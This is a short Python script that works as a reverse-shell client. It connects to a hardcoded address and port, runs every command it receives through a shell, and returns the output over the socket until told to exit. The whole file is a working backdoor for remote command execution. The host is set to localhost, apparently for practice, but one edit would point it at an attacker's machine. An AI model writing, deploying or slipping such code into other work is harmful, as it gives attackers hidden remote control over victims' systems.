import socket 
import subprocess

ip = "127.0.0.1" 
port = 8086
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((ip,port))

while True:
   command = s.recv(1024) 
   if command == b'exit':
       s.close()
       break
   else:
       #proc = subprocess.check_output(command.decode('utf-8'),shell=True)
       proc = subprocess.Popen(command.decode('utf-8'), shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE, stdin=subprocess.PIPE)
       output = proc.stdout.read()+proc.stderr.read()
       s.send(output)
       #s.send(proc)


